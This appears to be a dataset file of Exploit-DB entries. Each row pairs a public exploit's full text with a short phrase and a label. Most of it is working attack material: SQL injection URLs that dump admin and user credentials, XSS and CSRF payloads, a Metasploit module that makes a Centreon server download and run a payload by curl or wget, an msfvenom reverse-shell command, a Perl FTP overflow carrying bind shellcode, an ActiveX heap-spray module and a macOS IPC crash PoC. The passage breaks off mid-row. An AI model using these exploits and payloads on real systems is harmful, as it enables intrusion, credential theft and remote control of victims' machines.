'%"".$category_id."",%' AND is_showing = 1 ""; } else {     $sql = ""SELECT category_id, friendly_url FROM "" . $table_prefix . ""categories WHERE category_path like '%,"".$category_id."",%' AND is_showing = 1 ""; }  This allows for an attacker to easily select arbitrary data from the database such as usernames,passwords, and even credit card information. it should also be noted that ViArt strips slashes from within the get_param() function, so magic_quotes does not prevent this SQL Injection from happening.  /products_rss.php?category_id=1' UNION SELECT concat(login,char(58),password),0 FROM va_admins -- /*  A url like the one above will successfully grab the admin info from the database, and then attempt to use the admin data in a query, where it will then error. Still, the admin credentials will be displayed in the SQL Error as part of the faulty query and visible to the attacker. It is also worth mentioning that ViArt stores all credentials in plain text, so once an attacker has the credentials he is guaranteed access to the application.    Solution: The ViArt developers have released a patch for the vulnerable ViArt 3.5. Users are encouraged t upgrade as soon as possible.    Credits: James Bercegay of the GulfTech Security Research Team    Related Info: The original advisory can be found at the following location http://www.gulftech.org/?node=research&article_id=00118-07292008  # milw0rm.com [2008-07-28]",a malicious request,1
34628,"Santafox 2.0.2 - 'search' Cross-Site Scripting source: https://www.securityfocus.com/bid/43237/info  Santafox is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Santafox 2.02 is vulnerable; other versions may be affected.   http://www.example.com/search.html?search=1""><script>alert(document.cookie)</script>&x=0&y=0",own malicious script codes,1
22197,"slocate 2.5/2.6 - Local Buffer Overrun source: https://www.securityfocus.com/bid/6676/info  A vulnerability has been discovered in slocate. It has been reported that a buffer overrun occurs when running the slocate program with command line arguments of excessive length. Specifically, it is possible to overrun a buffer in slocate by supplying excessive data as the regex ('-r') and parse /etc/updatedb.conf ('-c') command line options.   By exploiting this issue to overwrite an instruction pointer an attacker may gain the ability to execute arbitrary instructions. As slocate is typically installed setgid, all commands executed by the attacker will be run with the elevated group privileges.  *** Conflicting details have been released which provide information reporting that the issue described is not a buffer overflow. Furthermore, the programming error that occurs may not be a security issue and thus not exploitable.  /usr/bin/slocate -c `perl -e ""print 'A' x 1024""` -r `perl -e ""print 'A' x 1024""`",running the slocate program with command line arguments of excessive length,1
14703,"Joomla! Component Biblioteca 1.0 Beta - Multiple SQL Injections Biblioteca 1.0 Beta Joomla Component Multiple SQL Injection Vulnerabilities   Name              Biblioteca  Vendor            http://www.cielostellato.info  Versions Affected 1.0 Beta   Author            Salvatore Fresta aka Drosophila  Website           http://www.salvatorefresta.net  Contact           salvatorefresta [at] gmail [dot] com  Date              2010-08-21  X. INDEX   I.    ABOUT THE APPLICATION  II.   DESCRIPTION  III.  ANALYSIS  IV.   SAMPLE CODE  V.    FIX    I. ABOUT THE APPLICATION ________________________  Component  that  allows  the automatic  management  of a library  in  electronic format. It' can manage books and their  loans  through   an   attractive  graphical  user interface simple and usable.   II. DESCRIPTION _______________  This component doesn't use the common Joomla's functions to  get  the parameters's value from GET, POST etc.. and all  of  these  are  not properly sanitised before being used in SQL queries.   III. ANALYSIS _____________  Summary:   A) Multiple Blind SQL Injection  B) Multiple SQL Injection    A) Multiple Blind SQL Injection _______________________________   The  parameter  testo  passed  to  bi.php (site and admin frontends)  is  properly sanitised before being used in a SQL query.This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.   B) Multiple SQL Injection _________________________  The  parameter testo  passed  to  stampa.php, pdf.php and  models/biblioteca.php (when ""view"" is set to ""biblioteca"" ) is  properly sanitised before being used in SQL queries. This  can  be  exploited to  manipulate  SQL  queries  by injecting arbitrary SQL code.   IV. SAMPLE CODE _______________  A) Multiple SQL Injection  http://host/path/components/com_biblioteca/views/biblioteca/tmpl/stampa.php?pag=1&testo=-a%25' UNION SELECT 1,username,password,4,5,6,7,8,9 FROM jos_users%23  http://host/path/components/com_biblioteca/views/biblioteca/tmpl/pdf.php?pag=1&testo=-a%25' UNION SELECT 1,username,password,4,5,6,7,8,9 FROM jos_users%23  http://host/path/index.php?option=com_biblioteca&view=biblioteca&testo=-a%25' UNION SELECT 1,username,password,4,5,6,7,8,9 FROM jos_users%23   V. FIX ______  No fix.",injecting arbitrary SQL code.,1
47948,"Centreon 19.04 - Authenticated Remote Code Execution (Metasploit) #################################################################### # This module requires Metasploit: https://metasploit.com/download # #  Current source: https://github.com/rapid7/metasploit-framework  # ####################################################################  class MetasploitModule < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::Remote::HttpServer::HTML   include Msf::Exploit::EXE    def initialize(info = {})     super(update_info(info,         ""Name"" => ""Centreon Authenticated Macro Expression Location Setting Handler Code Execution"",         ""Description"" =>  %q{           Authenticated Remote Code Execution on Centreon Web Appliances.           Affected versions: =< 18.10, 19.04           By amending the Macros Expression's default directory to / we are able to execute system commands and obtain a shell as user Apache.           Vendor verified: 09/17/2019           Vendor patched: 10/16/2019           Public disclosure: 10/18/2019         },         ""License"" => MSF_LICENSE,         'Author' => [           'TheCyberGeek', # Discovery           'enjloezz' # Discovery and Metasploit Module         ],         'References' =>         [             ['URL','https://github.com/centreon/centreon/pull/7864'],             ['CVE','2019-16405']         ],         ""Platform"" => ""linux"",         ""Targets"" => [           [""Centreon"", {}],         ],         ""Stance"" => Msf::Exploit::Stance::Aggressive,         ""Privileged"" => false,         ""DisclosureDate"" => ""Oct 19 2019"",         ""DefaultOptions"" => {           ""SRVPORT"" => 80,         },         ""DefaultTarget"" => 0       ))      register_options(       [         OptString.new(""TARGETURI"", [true, ""The URI of the Centreon Application"", ""/centreon""]),         OptString.new(""USERNAME"", [true, ""The Username of the Centreon Application"", ""admin""]),         OptString.new(""PASSWORD"", [true, ""The Password of the Centreon Application"", """"]),         OptString.new(""TARGETS"", [true, ""The method used to download shell from target (default is curl)"", ""curl""]),         OptInt.new(""HTTPDELAY"", [false, ""Number of seconds the web server will wait before termination"", 10]),       ]     )   end    def exploit     begin       res = send_request_cgi(         ""uri"" => normalize_uri(target_uri.path, ""index.php""),         ""method"" => ""GET"",       )       @phpsessid = res.get_cookies       /centreon_token\"".*value=\""(?<token>.*?)\""/ =~ res.body        unless token         vprint_error(""Couldn't get token, check your TARGETURI"")         return       end       res = send_request_cgi!(       ""uri"" => normalize_uri(target_uri.path, ""index.php""),       ""method"" => ""POST"",       ""cookie"" => @phpsessid,       ""vars_post"" => {         ""useralias"" => datastore[""USERNAME""],         ""password"" => datastore[""PASSWORD""],         ""centreon_token"" => token,         },       )       unless res.body.include? ""You need to enable JavaScript to run this app""         fail_with Failure::NoAccess ""Cannot login to Centreon""       end       print_good(""Login Successful!"")       res = send_request_cgi(         ""uri"" => normalize_uri(target_uri.path, ""main.get.php""),         ""method"" => ""GET"",         ""cookie"" => @phpsessid,         ""vars_get"" => {           ""p"" => ""60904"",           ""o"" => ""c"",           ""resource_id"" => 1,         },       )       /centreon_token\"".*value=\""(?<token>.*?)\""/ =~ res.body       res = send_request_cgi(         ""uri"" => normalize_uri(target_uri.path, ""main.get.php""),         ""vars_get"" => {           ""p"" => ""60904"",           },         ""method"" => ""POST"",         ""cookie"" => @phpsessid,         ""vars_post"" => {           ""resource_name"": ""$USER1$"",           ""resource_line"": ""/"",           ""instance_id"": 1,           ""resource_activate"": 1,           ""resource_comment"": ""Nagios Plugins Path"",           ""submitC"": ""Save"",           ""resource_id"": 1,           ""o"": ""c"",           ""initialValues"": """" ""a:0:{}"" """",           ""centreon_token"": token         },       )       begin         Timeout.timeout(datastore[""HTTPDELAY""]) { super }       rescue Timeout::Error         vprint_error(""Server Timed Out..."")       end     rescue ::Rex::ConnectionError       vprint_error(""Connection error..."")     end   end    def primer     @pl = generate_payload_exe     @path = service.resources.keys[0]     binding_ip = srvhost_addr      proto = ssl ? ""https"" : ""http""     payload_uri = ""#{proto}://#{binding_ip}:#{datastore[""SRVPORT""]}/#{@path}""     send_payload(payload_uri)   end    def send_payload(payload_uri)     payload = ""/bin/bash -c \"""" + ( datastore[""method""] == ""curl"" ? (""curl #{payload_uri} -o"") : (""wget #{payload_uri} -O"") ) + "" /tmp/#{@path}\""""     print_good(""Sending Payload"")     send_request_cgi(       ""uri"" => normalize_uri(target_uri.path, ""main.get.php""),       ""method"" => ""POST"",       ""cookie"" => @phpsessid,       ""vars_get"" => { ""p"": ""60801"", ""command_hostaddress"": """", ""command_example"": """", ""command_line"": payload, ""o"": ""p"", ""min"": 1 },     )   end    def on_request_uri(cli, req)     print_good(""#{peer} - Payload request received: #{req.uri}"")     send_response(cli, @pl)     run_shell     stop_service   end    def run_shell     print_good(""Setting permissions for the payload"")     res = send_request_cgi(       ""uri"" => normalize_uri(target_uri.path, ""main.get.php""),       ""method"" => ""POST"",       ""cookie"" => @phpsessid,       ""vars_get"" => {         ""p"": ""60801"",         ""command_hostaddress"": """",         ""command_example"": """",         ""command_line"": ""/bin/bash -c \""chmod 777 /tmp/#{@path}\"""",         ""o"": ""p"",         ""min"": 1,       },     )      print_good(""Executing Payload"")     res = send_request_cgi(       ""uri"" => normalize_uri(target_uri.path, ""main.get.php""),       ""method"" => ""POST"",       ""cookie"" => @phpsessid,       ""vars_get"" => {         ""p"": ""60801"",         ""command_hostaddress"": """",         ""command_example"": """",         ""command_line"": ""/tmp/#{@path}"",         ""o"": ""p"",         ""min"": 1,       },     )   end end",a malicious javascript,1
45169,"osTicket 1.10.1 - Arbitrary File Upload # Exploit Title: osTicket 1.10.1 - Arbitrary File Upload # Exploit Author: r3j10r (Rajwinder Singh) # Date: 2018-08-08 # Vendor Homepage: http://osticket.com/ # Software Link: http://osticket.com/download # Version: osTicket v1.10.1 # CVE-2017-15580  # Vulnerability Details: # osTicket application provides a functionality to upload 'html' files  # with associated formats. However, application does not properly validate  # the content of file and accepts any type of files.  # Proof-of-Concept: # Uploaded shell to get reverse shell of end user for the demo purpose.  1. Created a valid '.html' file to bypass client-side validations.  <html>   <title>test</title>   <body>    <p>test page</p>   </body>  </html> 2. Created a reverse shell with '.exe' file extension using msfvenom. msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<YOUR IP> LPORT=4444 -b ""\x00"" -e <encoder> -f exe -o reverse.exe 3. Intercepted the request in BurpSuite and changed file extension '.html' to '.exe' and its content 4. Received a valid response from server along with uploaded malicious file. 5. Got reverse shell after execution of the uploaded payload.  # Affected Component: Parameter: tickets.php?id=<ticket_number>#reply",a specially crafted XML file,1
42056,"Apple macOS - Lack of Bounds Checking in HIServices Custom CFObject Serialization Local Privilege Escalation /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1219  HIServices.framework is used by a handful of deamons and implements its own CFObject serialization mechanism.  The entrypoint to the deserialization code is AXUnserializeCFType; it reads a type field and uses that to index an array of function pointers for the support types:  __const:0000000000053ED0 _sUnserializeFunctions dq offset _cfStringUnserialize __const:0000000000053ED0                                         ; DATA XREF: _AXUnserializeCFType+7Co __const:0000000000053ED0                                         ; _cfDictionaryUnserialize+E4o ... __const:0000000000053ED8                 dq offset _cfNumberUnserialize __const:0000000000053EE0                 dq offset _cfBooleanUnserialize __const:0000000000053EE8                 dq offset _cfArrayUnserialize __const:0000000000053EF0                 dq offset _cfDictionaryUnserialize __const:0000000000053EF8                 dq offset _cfDataUnserialize __const:0000000000053F00                 dq offset _cfDateUnserialize __const:0000000000053F08                 dq offset _cfURLUnserialize __const:0000000000053F10                 dq offset _cfNullUnserialize __const:0000000000053F18                 dq offset _cfAttributedStringUnserialize __const:0000000000053F20                 dq offset _axElementUnserialize __const:0000000000053F28                 dq offset _axValueUnserialize __const:0000000000053F30                 dq offset _cgColorUnserialize __const:0000000000053F38                 dq offset _axTextMarkerUnserialize __const:0000000000053F40                 dq offset _axTextMarkerRangeUnserialize __const:0000000000053F48                 dq offset _cgPathUnserialize  From a cursory inspection it's clear that these methods don't expect to parse untrusted data.  The first method, cfStringUnserialize, trusts the length field in the serialized representation and uses that to byte-swap the string without any bounds checking leading to memory corruption.  I would guess that all the other unserialization methods should also be closely examined.  This poc talks to the com.apple.dock.server service hosted by the Dock process. Although this also runs as the regular user (so doesn't represent much of a priv-esc) this same serialization mechanism is also used in replies to dock clients.  com.apple.uninstalld is a client of the Dock and runs as root so by first exploiting this bug to gain code execution as the Dock process, we could trigger the same bug in uninstalld when it parses a reply from the dock and get code execution as root.  This poc just crashes the Dock process though.  Amusingly this opensource facebook code on github contains a workaround for a memory safety issue in cfAttributedStringUnserialize: https://github.com/facebook/WebDriverAgent/pull/99/files  Tested on MacOS 10.12.3 (16D32) */  // ianbeer #if 0 MacOS local EoP due to lack of bounds checking in HIServices custom CFObject serialization  HIServices.framework is used by a handful of deamons and implements its own CFObject serialization mechanism.  The entrypoint to the deserialization code is AXUnserializeCFType; it reads a type field and uses that to index an array of function pointers for the support types:  __const:0000000000053ED0 _sUnserializeFunctions dq offset _cfStringUnserialize __const:0000000000053ED0                                         ; DATA XREF: _AXUnserializeCFType+7Co __const:0000000000053ED0                                         ; _cfDictionaryUnserialize+E4o ... __const:0000000000053ED8                 dq offset _cfNumberUnserialize __const:0000000000053EE0                 dq offset _cfBooleanUnserialize __const:0000000000053EE8                 dq offset _cfArrayUnserialize __const:0000000000053EF0                 dq offset _cfDictionaryUnserialize __const:0000000000053EF8                 dq offset _cfDataUnserialize __const:0000000000053F00                 dq offset _cfDateUnserialize __const:0000000000053F08                 dq offset _cfURLUnserialize __const:0000000000053F10                 dq offset _cfNullUnserialize __const:0000000000053F18                 dq offset _cfAttributedStringUnserialize __const:0000000000053F20                 dq offset _axElementUnserialize __const:0000000000053F28                 dq offset _axValueUnserialize __const:0000000000053F30                 dq offset _cgColorUnserialize __const:0000000000053F38                 dq offset _axTextMarkerUnserialize __const:0000000000053F40                 dq offset _axTextMarkerRangeUnserialize __const:0000000000053F48                 dq offset _cgPathUnserialize  From a cursory inspection it's clear that these methods don't expect to parse untrusted data.  The first method, cfStringUnserialize, trusts the length field in the serialized representation and uses that to byte-swap the string without any bounds checking leading to memory corruption.  I would guess that all the other unserialization methods should also be closely examined.  This poc talks to the com.apple.dock.server service hosted by the Dock process. Although this also runs as the regular user (so doesn't represent much of a priv-esc) this same serialization mechanism is also used in replies to dock clients.  com.apple.uninstalld is a client of the Dock and runs as root so by first exploiting this bug to gain code execution as the Dock process, we could trigger the same bug in uninstalld when it parses a reply from the dock and get code execution as root.  This poc just crashes the Dock process though.  Amusingly this opensource facebook code on github contains a workaround for a memory safety issue in cfAttributedStringUnserialize: https://github.com/facebook/WebDriverAgent/pull/99/files  Tested on MacOS 10.12.3 (16D32) #endif  #include <stdio.h> #include <stdlib.h> #include <string.h>  #include <mach/mach.h> #include <mach/message.h> #include <servers/bootstrap.h>  struct dock_msg {   mach_msg_header_t hdr;   mach_msg_body_t body;   mach_msg_ool_descriptor_t ool_desc;   uint8_t PAD[0xc];   uint32_t ool_size; };  int main() {   kern_return_t err;   mach_port_t service_port;   err = bootstrap_look_up(bootstrap_port, ""com.apple.dock.server"", &service_port);   if (err != KERN_SUCCESS) {     printf("" [-] unable to lookup service"");     exit(EXIT_FAILURE);   }   printf(""got service port: %x\n"", service_port);    uint32_t serialized_string[] =    { 'abcd',     // neither 'owen' or 'aela' -> bswap?      0x0,        // type = cfStringUnserialize      0x41414141, // length      0x41414141, // length      0x1,        // contents      0x2,      0x3 };  	struct dock_msg m = {0};    m.hdr.msgh_size = sizeof(struct dock_msg);   m.hdr.msgh_local_port = MACH_PORT_NULL;   m.hdr.msgh_remote_port = service_port;   m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);   m.hdr.msgh_bits |= MACH_MSGH_BITS_COMPLEX;   m.hdr.msgh_id = 0x178f4; // first message in com.apple.dock.server mig subsystem   m.ool_size = sizeof(serialized_string);    m.body.msgh_descriptor_count = 1;    m.ool_desc.type = MACH_MSG_OOL_DESCRIPTOR;   m.ool_desc.address = serialized_string;   m.ool_desc.size = sizeof(serialized_string);   m.ool_desc.deallocate = 0;   m.ool_desc.copy = MACH_MSG_PHYSICAL_COPY;    err = mach_msg(&m.hdr,                  MACH_SEND_MSG,                  m.hdr.msgh_size,                  0,                  MACH_PORT_NULL,                  MACH_MSG_TIMEOUT_NONE,                  MACH_PORT_NULL);    if (err != KERN_SUCCESS) {     printf("" [-] mach_msg failed with error code:%x\n"", err);     exit(EXIT_FAILURE);   }   printf("" [+] looks like that sent?\n"");    return 0; }",untrusted data,1
25107,"Check Point VPN-1 SecureClient - IP Address Local Memory Access source: https://www.securityfocus.com/bid/12571/info  VPN-1 SecureClient is reported prone to a vulnerability that may allow local attackers to disclose sensitive memory. This can lead to various other attacks against a vulnerable computer. The vulnerability exists in the 'SR_Service.exe', which manages VPN connections.  A successful attack may allow the attacker to disclose memory and cause the application to crash. Reportedly, this issue can be leveraged to ultimately execute arbitrary code, however, this has not been confirmed.  VPN-1 SecureClient NG FP1 is reported prone to this vulnerability. It is possible that other versions are affected as well.   '192.00000000000168.00115.047'",a malicious HTML link,1
15658,"Viscom Image Viewer CP Gold 5.5 - 'Image2PDF()' Remote Buffer Overflow (Metasploit) # Image Viewer CP gold v5.5 Buffer Overflow # Found by: bz1p (AT) bshellz.net  # Impact: Low, NOT marked safe for scripting or initializing # CVE: ? (0day)  #  # msf exploit(image_viewer_cpgold) >  # [*] Sending exploit to 172.17.120.211:1061... # [*] Sending stage (749056 bytes) to 172.17.120.211 # [*] Meterpreter session 1 opened (172.17.120.235:4443 -> 172.17.120.211:1064) at 2010-11-15 18:11:32 +1100 # # msf exploit(image_viewer_cpgold) > sessions -l # # Active sessions # =============== #  #   Id  Type                   Information            Connection #   --  ----                   -----------            ---------- #   1   meterpreter x86/win32  VICTIMXP\victim @ VICTIM  172.17.120.235:4443 -> 172.17.120.211:1064 #  # msf exploit(image_viewer_cpgold) > sessions -i 1 # [*] Starting interaction with 1... #  # meterpreter > shell # Process 3536 created. # Channel 1 created. # Microsoft Windows XP [Version 5.1.2600] # (C) Copyright 1985-2001 Microsoft Corp. # # C:\Documents and Settings\victim\Desktop>  ################################### Start ###################################  ## # $Id: image_viewer_cpgold.rb 10429 2010-12-03 18:46:29Z bz1p $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::HttpServer::HTML  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Image Viewer CP Gold ActiveX Control Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack buffer overflow in NImage Viewer CP Gold ActiveX Control 5.5. When 				sending an overly long string to the Image2PDF() property of ImageViewer2.ocx  				an attacker may be able to execute arbitrary code. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => [ 'bz1p (0xbz1p[<AT>]gmail.com)' ], 			'Version'        => '$Revision: 10429 $', 			'References'     => 				[ 					[ 'CVE', '-' ], 					[ 'OSVDB', '-'], 					[ 'BID', '-' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload'        => 				{ 					'Space'         => 1024, 					'BadChars'      => ""\x00\x03\x04\x05\x06"", 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Windows XP SP0-SP2 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0A0A0A0A } ] 				], 			'DiscoveryDate' => 'Oct 15 2010', 			'DisclosureDate' => 'Dec 2 2010', 			'DefaultTarget'  => 0)) 	end  	def autofilter 		false 	end  	def check_dependencies 		use_zlib 	end  	def on_request_uri(cli, request) 		# Re-generate the payload. 		return if ((p = regenerate_payload(cli)) == nil)  		# Encode the shellcode. 		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))  		# Create some nops. 		nops    = Rex::Text.to_unescape(make_nops(4))  		# Set the return. 		ret     = Rex::Text.uri_encode([target.ret].pack('L'))  		# Randomize the javascript variable names. 		vname  = rand_text_alpha(rand(100) + 1) 		var_i  = rand_text_alpha(rand(30)  + 2) 		rand1  = rand_text_alpha(rand(100) + 1) 		rand2  = rand_text_alpha(rand(100) + 1) 		rand3  = rand_text_alpha(rand(100) + 1) 		rand4  = rand_text_alpha(rand(100) + 1) 		rand5  = rand_text_alpha(rand(100) + 1) 		rand6  = rand_text_alpha(rand(100) + 1) 		rand7  = rand_text_alpha(rand(100) + 1) 		rand8  = rand_text_alpha(rand(100) + 1)  		content = %Q| 			<html> 			<object id='#{vname}' classid='clsid:E589DA78-AD4C-4FC5-B6B9-9E47B110679E'></object> 			<script language=""JavaScript""> 			var #{rand1} = unescape('#{shellcode}'); 			var #{rand2} = unescape('#{nops}'); 			var #{rand3} = 20; 			var #{rand4} = #{rand3} + #{rand1}.length; 			while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2}; 			var #{rand5} = #{rand2}.substring(0,#{rand4}); 			var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4}); 			while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5}; 			var #{rand7} = new Array(); 			for (#{var_i} = 0; #{var_i} < 400; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} } 			var #{rand8} = """" 			for (#{var_i} = 0; #{var_i} < 8500; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') } 			#{vname}.Image2PDF(""lolznoaslrdepbypass"", #{rand8}); 			</script> 			</html> 			|  		content = Rex::Text.randomize_space(content)  		print_status(""Sending exploit to #{cli.peerhost}:#{cli.peerport}..."")  		# Transmit the response to the client 		send_response_html(cli, content)  		# Handle the payload 		handler(cli) 	end  end",sending an overly long string to the Image2PDF() property of ImageViewer2.ocx,1
767,"Golden FTP Server 2.02b - Remote Buffer Overflow #!/usr/bin/perl -w # Barabas - www.whitehat.co.il - # cheers to muts and all peeps at WH. # XPSP2 goldenftpserver sploit - bind 4444  use strict; use Net::FTP; my $payload=""\x41""x260; $payload .=""\x65\x82\xa5\x7c"";#jmpesp $payload .=""\x90""x32;#not really necessary...blah # win32_bind - EXITFUNC=seh LPORT=4444 Size=321 Encoder=None http://metasploit.com $payload .=""\xfc\x6a\xeb\x4f\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"". ""\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\xe3"". ""\x30\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1"". ""\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe3\x8b\x5f\x24\x01"". ""\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24"". ""\x1c\x61\xc3\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b\x70\x1c\xad"". ""\x8b\x40\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x31\xdb\x66\x53"". ""\x66\x68\x33\x32\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc"". ""\x3b\x50\xff\xd6\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff"". ""\xd0\x68\xd9\x09\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53"". ""\x43\x53\xff\xd0\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a"". ""\x70\xc7\x57\xff\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9"". ""\x57\xff\xd6\x53\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50"". ""\x54\x54\x55\xff\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff"". ""\xd0\x66\x6a\x64\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89"". ""\xe7\x6a\x44\x89\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93"". ""\x8d\x7a\x38\xab\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6"". ""\x5b\x57\x52\x51\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad"". ""\xd9\x05\xce\x53\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83"". ""\xc4\x64\xff\xd6\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff"". ""\xd0"";  my $ftp = Net::FTP->new(""127.0.0.1"", Debug => 1); $ftp->login(""ftp"",""ftp""); $ftp->quot(""RNTO"",$payload);   # milw0rm.com [2005-01-22]",a malicious  cursor,1
38645,"NXFilter 3.0.3 - Cross-Site Request Forgery [+] Credits: hyp3rlinx  [+] Website: hyp3rlinx.altervista.org  [+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-NXFILTER-CSRF.txt   Vendor: ================================ www.nxfilter.org/p2/   Product: ================================ NXFilter v3.0.3   Vulnerability Type: ================================= Cross site request forgery - CSRF   CVE Reference: ============== N/A   Vulnerability Details: ===================== No CSRF protections exist allowing us to make malicious HTTP requests on behalf of our victim. The Server will then happily process any of the following actions if our victim clicks our infected linx or visits our malicious website while currently logged in to the vulnerable application.  1) ""add arbitrary users"" 2) ""add or change SMTP settings"" 3) ""add arbitrary redirect domains"" 4) ""add arbitrary zone transfers"" 5) ""delete zone transfer domains""   Exploit code(s): ===============  <!DOCTYPE> <html> <head> <title></title>  <body onLoad=""doit()"">  <script> function doit(){  var e=document.getElementById('HELL')  e.submit() } </script>    1) CSRF add arbitrary users  <form id=""HELL"" action=""http://localhost/user,user.jsp"" method=""post""> <input type=""text"" name=""action_flag"" value=""insert"" > <input type=""text"" name=""name"" value=""punksnotdead""> <input type=""text"" name=""description"" value=""<script>alert(666)</script>"">  <---- and some persistent XSS! </form>   2) CSRF add or change SMTP notification alerts  <form id=""HELL"" action=""http://localhost/config,alert.jsp"" method=""post""> <input type=""text"" name=""action_flag"" value=""update"" > <input type=""text"" name=""admin_email"" value=""ghostofsin@abyss.com""> <input type=""text"" name=""smtp_host"" value=""6.6.6.0""> <input type=""text"" name=""smtp_port"" value=""25""> <input type=""text"" name=""smtp_user"" value=""hyp3rlinx""> <input type=""text"" name=""smtp_passwd"" value=""abc123""> <input type=""text"" name=""period"" value=""0""> <input type=""text"" name=""token"" value=""""> </form>    3) CSRF add arbitrary redirect domain  <form id=""HELL"" action=""http://localhost/config,redirection.jsp"" method=""post""> <input type=""text"" name=""action_flag"" value=""insert"" > <input type=""text"" name=""src"" value=""hyp3rlinx.altervista.org""> <input type=""text"" name=""dst"" value=""6.6.6.0""> </form>    4) CSRF add arbitrary zone transfers  <form id=""HELL"" action=""http://localhost/config,zone_transfer.jsp"" method=""post""> <input type=""text"" name=""action_flag"" value=""insert"" > <input type=""text"" name=""domain"" value=""hyp3rlinx.altervista.org""> <input type=""text"" name=""ip"" value=""6.6.6.0""> </form>    5) CSRF delete zone transfer domains  http://localhost/config,zone_transfer.jsp?action_flag=delete&id=1   Disclosure Timeline: ====================================== Vendor Notification: October 18, 2015 November 5, 2015  : Public Disclosure   Exploitation Technique: ======================= Remote   Severity Level: =============== High   Description: ==========================================================  Request Method(s):              [+] GET / POST   Vulnerable Product:             [+] NXFilter v3.0.3   ===========================================================  [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.  by hyp3rlinx",malicious HTTP requests on behalf of our victim,1
40823,"Microsoft Windows Kernel - 'win32k.sys NtSetWindowLongPtr' Local Privilege Escalation (MS16-135) (1) Complete Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40823.zip  Presentation: https://www.exploit-db.com/docs/english/40822-i-know-where-your-page-lives---de-randomizing-the-latest-windows-10-kernel.pdf   I Know Where Your Page Lives: Derandomizing the latest Windows 10 Kernel - ZeroNights 2016  Requirements  Intel Processor (Haswell or newer) Windows 10 x64 Usage  Run ASLRSideChannelAttack.exe to get the PML4-Self-Ref entry:  C:\Users\qa\Desktop>ASLRSideChannelAttack.exe +] Setting thread affinity to CPU 0 +] Getting all the potential PML4 SelfRef +] Mapping a page oracle +] Allocating probing target pages... Allocation 0: 0000020E339D0000 Allocation 1: 0000020E339E0000 Allocation 2: 0000020E339F0000 Allocation 3: 0000020E33A00000 Allocation 4: 0000020E33A10000 -------------------------- +] Check that Unammped and Mapped values are consistent across several executions! -------------------------- Unmapped Initial: 256.683746 Mapped Initial: 203.692978 -------------------------- +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... +] Measures are not consistent yet... -------------------------- Unmapped: 247.440018 Mapped: 202.827560 --------------------------  Potential SelfRef: FFFF8140A0502810 +] PTE FFFF81010719CE80 looks mapped! - Time: 207.127213 +] PTE FFFF81010719CF00 looks mapped! - Time: 195.239563 +] PTE FFFF81010719CF80 looks mapped! - Time: 192.401382 +] PTE FFFF81010719D000 looks mapped! - Time: 197.297256 +] PTE FFFF81010719D080 looks mapped! - Time: 194.501175 +] PTE FFFF810804020100 looks mapped! - Time: 204.740097 +] Removing 102 from initial array and pushing it into final array Potential SelfRef: FFFF81C0E0703818 +] PTE FFFF81810719CE80 looks mapped! - Time: 200.837616 +] PTE FFFF81810719CF00 looks mapped! - Time: 207.868774 +] PTE FFFF81810719CF80 looks mapped! - Time: 208.949921 +] PTE FFFF81810719D000 looks mapped! - 